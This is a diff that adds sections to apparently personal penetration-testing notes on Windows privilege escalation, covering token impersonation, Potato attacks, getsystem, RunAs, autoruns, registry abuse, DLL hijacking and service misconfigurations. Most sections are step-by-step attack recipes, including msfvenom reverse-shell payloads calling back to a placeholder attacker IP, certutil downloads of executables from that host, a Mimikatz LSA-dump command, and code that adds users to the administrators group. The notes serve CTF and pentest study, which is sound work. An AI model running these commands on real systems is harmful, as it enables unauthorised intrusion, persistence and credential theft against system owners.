@@ -789,3 +789,674 @@ Windows Subsystem for Linux (WSL) is a powerful feature in Windows environments,
 - WSL persistence can be used to maintain continuous access to a compromised system.
 
 By combining these techniques, attackers can effectively escalate privileges and gain control over a compromised Windows environment using WSL.
+
+# **Token Impersonation and Potato Attacks**
+
+**Token Impersonation** and **Potato Attacks** are methods used for privilege escalation in Windows systems, allowing attackers to gain higher privileges, such as **SYSTEM** or **Administrator**, by exploiting specific tokens and system weaknesses.
+
+---
+
+### **What Are Tokens?**
+
+In Windows, tokens are temporary keys that grant users access to a system or network without needing to re-authenticate for every action. These tokens can be compared to cookies in web browsers that store session data.
+
+### **Types of Tokens:**
+
+1. **Delegate Tokens**:
+    - Created for actions like logging into a machine or using **Remote Desktop**.
+    - These are "interactive" tokens.
+2. **Impersonate Tokens**:
+    - Created for "non-interactive" actions, such as attaching a network drive or running a domain logon script.
+    - Impersonation tokens allow processes to perform actions on behalf of another user without requiring direct interaction.
+
+---
+
+### **Token Impersonation: How It Works**
+
+In **token impersonation**, an attacker leverages the ability to take control of another user’s token, specifically one with higher privileges, to execute commands with elevated rights.
+
+### **Example Using Meterpreter**:
+
+1. **Identify the current user**:
+    
+    ```bash
+    getuid
+    ```
+    
+2. **Load Incognito** (a tool for token manipulation):
+    
+    ```bash
+    load incognito
+    ```
+    
+3. **List available tokens** to impersonate:
+    
+    ```bash
+    list_tokens -u
+    ```
+    
+4. **Impersonate a token** for a user with higher privileges:
+    
+    ```bash
+    impersonate_token <domain\\user>
+    ```
+    
+5. **Obtain a shell** with the elevated token:
+    
+    ```bash
+    shell
+    ```
+    
+
+### **Practical Use**:
+
+If you attempt to dump **LSA** secrets (Local Security Authority) but lack the necessary permissions, you can impersonate another user with more privileges. For example:
+
+```bash
+Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject" exit' -Computer <DC.domain.local>
+```
+
+This allows you to bypass restrictions by impersonating another account with higher access.
+
+---
+
+### **Impersonation Privileges**
+
+To successfully use token impersonation, certain privileges must be available:
+
+1. **SeAssignPrimaryToken**: Allows a process to assign the primary token for another process.
+2. **SeImpersonatePrivilege**: Allows a process to impersonate another user.
+3. **SeTakeOwnership**: Allows a user to take ownership of objects (such as files) on the system.
+
+You can check the privileges available to your current session:
+
+- **In Meterpreter**:
+    
+    ```bash
+    getprivs
+    ```
+    
+- **In a shell**:
+    
+    ```bash
+    whoami /priv
+    ```
+    
+
+If **SeImpersonatePrivilege** or **SeAssignPrimaryToken** is available, you can attempt **Potato Attacks**.
+
+---
+
+### **Potato Attacks**
+
+**Potato Attacks** exploit weaknesses in the way Windows handles tokens and permissions, particularly the ability to impersonate tokens with high privileges, like **SYSTEM**.
+
+### **Types of Potato Attacks**:
+
+1. **Rotten Potato**:
+    - Rotten Potato is a technique used to escalate privileges from a service account to **SYSTEM** by manipulating the way Windows handles authentication protocols.
+    - Detailed guide: [Rotten Potato - Foxglove Security](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/).
+2. **Juicy Potato**:
+    - An improvement over Rotten Potato, **Juicy Potato** exploits the **DCOM** service (Distributed Component Object Model) to escalate privileges on Windows.
+    - Detailed guide: [Juicy Potato - GitHub](https://github.com/ohpe/juicy-potato).
+
+### **Juicy Potato Example**:
+
+1. First, download **Juicy Potato** from the [GitHub repository](https://github.com/ohpe/juicy-potato).
+2. **Transfer the executable to the target machine**:
+    - On your Kali Linux machine, start a Python server:
+        
+        ```bash
+        python3 -m http.server 80
+        ```
+        
+    - On the Windows target machine, download the file:
+        
+        ```bash
+        certutil -urlcache -f http://<kali-ip>/juicy.exe C:\Temp\juicy.exe
+        ```
+        
+3. **Run Juicy Potato**:
+    - On the target machine, execute Juicy Potato with specific parameters:
+        
+        ```bash
+        juicy.exe -t * -p cmd.exe -l 1337
+        ```
+        
+    - This command attempts to escalate the current privileges to **SYSTEM** by exploiting DCOM.
+4. Once successful, you now have **SYSTEM** privileges and can execute any command with the highest permissions.
+
+### **Potato Attack Indicators**:
+
+- **SeAssignPrimaryToken** and **SeImpersonatePrivilege** are critical for Potato attacks. If these privileges are enabled for your session, you can attempt these attacks.
+
+---
+
+### **Conclusion**
+
+- **Token Impersonation** is a powerful technique in which attackers leverage tokens from higher-privileged accounts to elevate their permissions.
+- **Potato Attacks** (like Rotten Potato and Juicy Potato) exploit weaknesses in Windows’ privilege handling to escalate permissions from lower-level service accounts to **SYSTEM**.
+- Always check for the availability of **SeAssignPrimaryToken** and **SeImpersonatePrivilege** privileges to attempt these attacks.
+
+Understanding and exploiting these techniques can be critical in Windows privilege escalation scenarios, particularly in penetration testing and red team engagements.
+
+# **Escalation Path: `getsystem`**
+
+### **What happens when I type `getsystem`?**
+
+The `getsystem` command is a **privilege escalation** method in **Meterpreter** (part of the Metasploit Framework). When you execute this command, it attempts to elevate your current user privileges to the highest level, typically **SYSTEM** privileges, which are equivalent to root access in Unix-based systems.
+
+- **`getsystem`** uses three different techniques for privilege escalation:
+    1. **Named Pipe Impersonation (In Memory/Admin)**: This method impersonates the named pipes created in memory, typically used by services running under SYSTEM privileges.
+    2. **Named Pipe Impersonation (On Disk/Admin)**: This method writes data to disk, but is often detected by antivirus (AV) software, which makes it less ideal.
+    3. **Token Duplication (In Memory/Admin)**: This method duplicates a security token and requires **SeDebugPrivilege**, a privilege that allows the user to debug and manipulate the operating system. If you have this privilege enabled, this method may succeed.
+
+In Meterpreter, you can run:
+
+```
+getsystem
+getsystem -h
+```
+
+- The `h` flag shows the available options to use with the `getsystem` command, such as choosing a specific technique.
+
+### **What Does `getsystem` Do?**
+
+- The command attempts to **escalate privileges** to SYSTEM by leveraging Windows privilege vulnerabilities.
+- It first checks for **SeDebugPrivilege**, which allows the duplication of the SYSTEM token. This is an essential step since SYSTEM tokens give complete control over the machine.
+- It uses **Named Pipe Impersonation** as another option if token duplication is not possible. This involves hijacking service pipes that are running under SYSTEM privileges.
+
+# **Escalation Path: `RunAs`**
+
+### **Overview**
+
+The `RunAs` command in Windows allows a user to run a command or application as another user, typically with higher privileges, such as an administrator. It is a common method used in privilege escalation attacks to execute actions under a different account, often with **SYSTEM** or **Administrator** privileges, when the attacker already has some level of access.
+
+### **FootHold - Access on Hack The Box (HTB)**
+
+In this example scenario, an attacker gains initial access by exploiting services like **FTP** to gather files that might contain sensitive information, including user credentials.
+
+Steps to follow:
+
+1. **Enter the FTP server**: This might be achieved through an open FTP service. The attacker can download files hosted on the FTP server.
+2. **Extract data from files**:
+    - Use the command `mdb-sql <db.mdb>` to open a database file and extract user-related information (e.g., usernames).
+    - Use `readpst <pst file>` to extract contents from a **PST** file (Outlook personal storage file) to potentially reveal sensitive information like user credentials.
+3. **Login via Telnet**: After obtaining user credentials from the database or email, the attacker can attempt to login to the system through **Telnet** (if the service is available and enabled).
+
+### **Privilege Escalation**
+
+Once the attacker has a foothold, they can attempt to escalate privileges to an administrative level using the `RunAs` command.
+
+### **Steps for Privilege Escalation:**
+
+1. **List stored credentials**:
+Use the following command to list any cached credentials on the machine:
+    
+    ```
+    cmdkey /list
+    ```
+    
+2. **Run the command as an Administrator**:
+If the attacker has access to an administrative account's credentials, they can execute the following `runas` command to escalate privileges and access sensitive files:
+    
+    ```
+    C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
+    ```
+    
+    - **/user\Administrator**: Specifies the user account to run the command as.
+    - **/savecred**: Saves the provided credentials for future use.
+    - The command runs `cmd.exe` and uses it to read the **root.txt** file located on the **Administrator's** desktop, and then copies its contents to the attacker's own directory (e.g., **security**).
+
+### **Explanation**
+
+This technique allows the attacker to execute commands as the **Administrator**, enabling them to access sensitive information (such as the **root.txt** file, which could contain flags or critical information on the target system). By using `runas` with `/savecred`, the attacker can bypass the need to repeatedly enter credentials and execute future commands with the same level of privilege without prompt.
+
+# **Escalation Path : Registry and Autorun Vulnerabilities**
+
+When targeting Windows systems, attackers often exploit various vulnerabilities to escalate privileges. Two common attack paths involve **Registry Escalation** and **Autorun Vulnerabilities**. Here's an in-depth look at how these paths work and how they can be leveraged for privilege escalation.
+
+---
+
+### **Overview of Autoruns**
+
+**Autoruns** refer to programs that automatically execute when the system starts. These programs are often registered in the system registry and may be exploited if improper permissions are set. Attackers can take advantage of these vulnerabilities by replacing authorized programs with malicious versions.
+
+### **Steps to Identify Autorun Vulnerabilities**
+
+1. **Running Autoruns:**
+    - First, use the **Autoruns** tool to find potential vulnerabilities. For example:
+        
+        ```bash
+        C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
+        ```
+        
+2. **Check Permissions on Autorun Programs:**
+    - Using the **AccessChk** tool, check the permissions of autorun programs:
+        
+        ```bash
+        C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
+        ```
+        
+3. **Run PowerUp to Find Vulnerabilities:**
+    - PowerUp is a PowerShell script designed to identify misconfigurations that can lead to privilege escalation. To check for autorun vulnerabilities, run:
+        
+        ```bash
+        powershell -ep bypass
+        . .\PowerUp.ps1
+        Invoke-AllChecks
+        ```
+        
+
+---
+
+### **Escalation via Autorun**
+
+If an autorun program is vulnerable, you can escalate privileges by replacing the authorized executable with a malicious payload.
+
+### **Steps to Exploit an Autorun Program:**
+
+1. **Create a Malicious Payload:**
+    - Use **msfvenom** to create a malicious executable:
+        
+        ```bash
+        msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o program.exe
+        ```
+        
+2. **Set up a Listener in Metasploit:**
+    - In **msfconsole**, set up a listener to capture the reverse shell:
+        
+        ```bash
+        use multi/handler
+        set options
+        ```
+        
+3. **Replace the Legitimate Autorun Program:**
+    - Transfer `program.exe` to the target Windows machine and replace the legitimate program located in `/Program Files/Autorun Program/` with your malicious version:
+        
+        ```bash
+        # Replace the existing executable with our program.exe
+        ```
+        
+4. **Trigger the Autorun:**
+    - After disconnecting from the machine, when the autorun program starts (e.g., after a reboot), it will execute your malicious payload, granting you a **Meterpreter shell** with SYSTEM privileges.
+
+---
+
+### **AlwaysInstallElevated Exploit**
+
+The **AlwaysInstallElevated** setting is a Windows configuration that allows non-administrative users to install MSI packages with elevated privileges. If this setting is enabled, attackers can exploit it to run malicious code as an administrator.
+
+### **Check for AlwaysInstallElevated Vulnerability:**
+
+1. **Check the Registry Settings:**
+    - To verify if this vulnerability is present, query the Windows registry:
+        
+        ```bash
+        reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+        reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+        ```
+        
+    - If the value of `AlwaysInstallElevated` is `1`, the system is vulnerable.
+2. **Create a Malicious MSI Package:**
+    - Use **msfvenom** to create a malicious MSI package:
+        
+        ```bash
+        msfvenom -p windows/meterpreter/reverse_tcp lhost=<your ip> -f msi -o setup.msi
+        ```
+        
+3. **Run the MSI Package:**
+    - Transfer `setup.msi` to the target machine and execute it. Ensure you have a listener running in **Metasploit** to catch the shell.
+
+---
+
+### **Registry ACL Exploits**
+
+Registry keys control various aspects of the system’s functionality. If an attacker has full control over a registry key, they can modify it to execute arbitrary commands or escalate privileges.
+
+### **Check Registry ACL Permissions:**
+
+1. **Test for Full Control over a Registry Key:**
+    - Use PowerShell to check the ACL (Access Control List) of a registry key:
+        
+        ```bash
+        Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+        ```
+        
+    - If the output shows **FullControl**, the current user can modify the key.
+
+### **Escalation via Registry Key Exploitation:**
+
+1. **Create a Malicious Executable:**
+    - Compile a malicious C program designed to add a user to the administrators' group:
+        
+        ```c
+        system("net localgroup administrators user /add");
+        ```
+        
+2. **Compile the C Program:**
+    - On your Kali machine, use **gcc** to compile the C program:
+        
+        ```bash
+        x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+        ```
+        
+3. **Modify the Registry Key:**
+    - Transfer the compiled `x.exe` to the Windows machine and modify the registry key to point to this executable:
+        
+        ```bash
+        reg add HKLM\System\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+        ```
+        
+4. **Start the Service:**
+    - Start the service associated with the registry key:
+        
+        ```bash
+        sc start regsvc
+        ```
+        
+5. **Confirm Escalation:**
+    - After running the malicious executable, check if the user was added to the **administrators** group:
+        
+        ```bash
+        net localgroup administrators
+        ```
+        
+
+---
+
+### **Conclusion**
+
+The combination of registry misconfigurations and autorun vulnerabilities provides several paths for privilege escalation in Windows systems. Attackers can replace autorun programs, exploit AlwaysInstallElevated settings, and manipulate registry keys to gain elevated access. Security teams should regularly audit registry settings, autorun programs, and user permissions to mitigate these risks.
+
+# **Privilege Escalation Path: Executable Files**
+
+### **Detection**
+
+Privilege escalation through executable files often involves discovering vulnerable files that have misconfigured permissions, allowing unauthorized users to replace or manipulate them.
+
+### **Using PowerUp**
+
+1. **Run PowerUp Script:**
+PowerUp is a PowerShell script designed to find common privilege escalation vulnerabilities. To use it:This command will run all checks and identify potential privilege escalation paths, including those involving executable files with weak permissions.
+    
+    ```bash
+    . .\PowerUp.ps1
+    Invoke-AllChecks
+    ```
+    
+
+### **Manual Detection**
+
+1. **Using AccessChk Tool:**
+Another method is to manually check the permissions of specific files using the **AccessChk** tool. This tool reveals which users have what type of access to certain files.
+    
+    ```bash
+    C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+    ```
+    
+    - In this case, you'll notice that the "Everyone" user group has **FILE_ALL_ACCESS** permission on the file `filepermservice.exe`. This means anyone can modify or replace this file, which is a critical security misconfiguration.
+
+### **Escalation**
+
+Once you've identified the vulnerable executable, you can exploit it by replacing it with a malicious file.
+
+### **Steps for Exploitation:**
+
+1. **Generate a Malicious File:**
+First, create a malicious executable that will run commands with elevated privileges. This can be done using a C compiler like **Mingw**:
+    
+    ```bash
+    x86_x64-w64-mingw32-gcc windows_service.c -o x.exe
+    ```
+    
+    This will compile the C code into an executable file (`x.exe`).
+    
+2. **Replace the Vulnerable Executable:**
+Once the malicious file (`x.exe`) is ready, replace the vulnerable executable (`filepermservice.exe`) in the target location:
+    
+    ```bash
+    copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+    ```
+    
+3. **Start the Service:**
+After replacing the file, restart the vulnerable service to execute the malicious code:
+    
+    ```bash
+    sc start filepermsvc
+    ```
+    
+4. **Check for Administrator Privileges:**
+To confirm that the malicious file has escalated privileges, check if the current user was added to the **local administrators group**:
+    
+    ```bash
+    net localgroup administrators
+    ```
+    
+    If the user has been added, you now have administrative access, granting root-level control over the system.
+    
+
+### **Summary**
+
+By exploiting misconfigured file permissions, such as the **FILE_ALL_ACCESS** permission on executables, attackers can replace legitimate system files with malicious versions. When the system executes these files (e.g., through a service restart), the attacker’s code runs with elevated privileges, leading to full system compromise.
+
+# Escalation Path: Startup Application
+
+### Overview
+
+This escalation path uses the same concept as an **autorun attack**, where an application automatically starts up when a machine is booted. The idea is to exploit this feature by placing a malicious file in the startup folder to gain a reverse shell or escalate privileges.
+
+Unlike other privilege escalation methods, **PowerUp** (a common privilege escalation tool in PowerShell) may not detect this vulnerability, so manual detection is required.
+
+### Detection
+
+To check if the **Startup** folder is vulnerable, you can use the following command in the command prompt or PowerShell:
+
+```bash
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+
+From the output, if you notice that the group `BUILTIN\Users` has **Full access** (`(F)`), this indicates that all users, including non-administrators, have full control over the files in this folder. This level of access allows them to modify or replace files, which creates a potential security risk.
+
+- **F** = Full access (read, write, modify, execute)
+- **M** = Modify access (read, write, modify)
+- **RX** = Read and execute access
+- **R** = Read-only access
+
+### Escalation Process
+
+1. **Setup Metasploit Listener**:
+Start by opening Metasploit on your attacking machine (e.g., Kali Linux) and set up a listener using the **multi/handler** module to catch the reverse shell:
+    
+    ```bash
+    msfconsole
+    use multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set lhost <kali ip>
+    set lport <port>
+    exploit
+    ```
+    
+2. **Generate the Exploit**:
+Create a malicious executable using **msfvenom**. This payload will connect back to your listener when executed on the target machine.
+    
+    ```bash
+    msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o y.exe
+    ```
+    
+3. **Transfer the Exploit to the Target**:
+You can transfer the malicious `y.exe` file to the target system using various methods like:
+    - **FTP** server
+    - **Python HTTP server**
+    - Using `certutil` on Windows to download the file from your attacking machine:
+        
+        ```bash
+        certutil -urlcache -split -f "http://<kali-ip>/y.exe" y.exe
+        ```
+        
+4. **Save the Exploit in the Startup Folder**:
+Once you have the exploit file on the target machine, place it in the **Startup** folder:
+    
+    ```bash
+    copy /y y.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+    ```
+    
+5. **Restart the Machine**:
+Reboot the target machine. When the machine boots up, any executable in the Startup folder will automatically run. Since you've placed your malicious executable there, it will execute upon boot, giving you a reverse shell back to your Kali machine.
+6. **Catch the Shell**:
+After the reboot, your **msfconsole** listener will receive a connection from the target, and you'll gain a **Meterpreter shell** with the same privileges as the user that executed the startup file.
+
+This technique is useful when non-admin users have write access to the **Startup** folder, allowing them to replace or add malicious executables that run automatically on system startup.
+
+### Important Notes:
+
+- This method relies on improper access controls for the **Startup** folder. Administrators should regularly audit permissions on critical directories like this to prevent exploitation.
+- **Full access (F)** for non-administrative users on directories related to system functions, like Startup, poses significant security risks.
+
+By exploiting this misconfiguration, an attacker can persist their access and potentially escalate their privileges further.
+
+# Escalation Path: DLL Hijacking
+
+### Overview of DLL Hijacking:
+
+- **DLL** stands for Dynamic Link Library, which contains code and data used by multiple programs simultaneously.
+- In a **DLL Hijacking** attack, the attacker exploits a missing or improperly loaded DLL by placing a malicious version in a writable directory.
+- The key idea is to look for a **DLL** that the system tries to load but cannot find (resulting in a "NAME NOT FOUND" error). If the directory for that missing DLL is writable, an attacker can place a malicious DLL with the same name in that path.
+
+### Escalation Process:
+
+1. **Detect Missing DLLs with Process Monitor:**
+    - Run **Process Monitor** and set filters to capture failed DLL loading attempts:
+        - Filter by `Result` is "NAME NOT FOUND."
+        - Filter by paths that end with `.dll`.
+2. **Stop and Start the Target Service:**
+    - Stop the vulnerable service:
+        
+        ```bash
+        sc stop dllsvc
+        ```
+        
+    - Start the vulnerable service again:
+        
+        ```bash
+        sc start dllsvc
+        ```
+        
+3. **Prepare the Malicious DLL:**
+    - Obtain the `windows_dll.c` file and modify it to include a command to escalate privileges. For example, to add a user to the local administrators group:
+        
+        ```c
+        system("cmd.exe /k net localgroup administrators userBatman /add");
+        ```
+        
+4. **Compile the Malicious DLL:**
+    - Compile the modified file into a DLL format:
+        
+        ```bash
+        x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+        ```
+        
+5. **Send the Malicious DLL to the Target:**
+    - Use a **Python server** to transfer the malicious DLL to the target machine.
+    - Save the malicious DLL in a writable directory on the target machine, such as `C:\Temp\`.
+6. **Replace the Missing DLL and Restart the Service:**
+    - Once the DLL is in place, stop and start the service again to trigger the loading of your malicious DLL:
+        
+        ```bash
+        sc stop dllsvc
+        sc start dllsvc
+        ```
+        
+    
+    When the service starts, it will load the malicious DLL from the writable location, executing the embedded commands (in this case, adding the user `userBatman` to the local administrators group), leading to privilege escalation.
+    
+
+---
+
+By exploiting DLL Hijacking, an attacker can gain elevated privileges or perform malicious actions by inserting their DLL into the system's loading process. This technique can be particularly effective if the vulnerable service runs with high privileges, like SYSTEM or administrator.
+
+# **Escalation via Service Permissions**
+
+This method takes advantage of improper service permissions, specifically when a service grants write access to unauthorized users, allowing modification of its configuration.
+
+### Steps:
+
+1. **Identify Vulnerable Services with PowerUp:**
+    - Run PowerUp to automatically identify misconfigurations in service permissions.
+        
+        ```powershell
+        powershell -ep bypass
+        . .\PowerUp.ps1
+        Invoke-AllChecks
+        ```
+        
+2. **Manual Check with `accesschk`:**
+    - Use `accesschk64.exe` to check for services with write access for unauthorized users.
+        
+        ```bash
+        accesschk64.exe -uwcv Everyone *
+        ```
+        
+    - Narrow down to a specific service (e.g., `daclsvc`):
+        
+        ```bash
+        accesschk64.exe -uwcv daclsvc
+        sc qc daclsvc
+        ```
+        
+3. **Exploit the Service (If Vulnerable):**
+    - If you have write access (`SERVICE_CHANGE_CONFIG`), modify the service configuration to run a command (e.g., adding a user to the Administrators group).
+        
+        ```bash
+        sc config daclsvc binpath= "net localgroup administrators user /add"
+        sc stop daclsvc
+        sc start daclsvc
+        ```
+        
+    - Check if the user was successfully added:
+        
+        ```bash
+        net localgroup administrators
+        ```
+        
+
+### 2. **Escalation via Unquoted Service Paths**
+
+In this method, unquoted service paths that contain spaces are exploited. If a service path isn't enclosed in quotes, Windows may search for executables in unintended locations, potentially running malicious code.
+
+### Steps:
+
+1. **Identify Unquoted Service Paths:**
+    - Use PowerUp to find unquoted service paths.
+        
+        ```powershell
+        powershell -ep bypass
+        . .\PowerUp.ps1
+        Invoke-AllChecks
+        ```
+        
+2. **Prepare a Malicious Payload:**
+    - Generate a payload using `msfvenom` for Meterpreter or Netcat:
+        - **For Meterpreter:**
+            
+            ```bash
+            msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o common.exe
+            ```
+            
+        - **For Netcat:**
+            
+            ```bash
+            msfvenom -p windows/reverse_tcp lhost=<kali ip> -f exe -o common.exe
+            ```
+            
+3. **Exploit the Unquoted Path:**
+    - Place the malicious executable in a writable directory within the unquoted service path.
+    - Start the vulnerable service:
+        
+        ```bash
+        sc start unquotedsvc
+        ```
+        
+    - If successful, you should receive a shell back (e.g., via a listener with `multi/handler` or `netcat`).
+
+These techniques are common in privilege escalation scenarios for CTFs or penetration tests, where you gain elevated privileges on a Windows system by exploiting service misconfigurations.
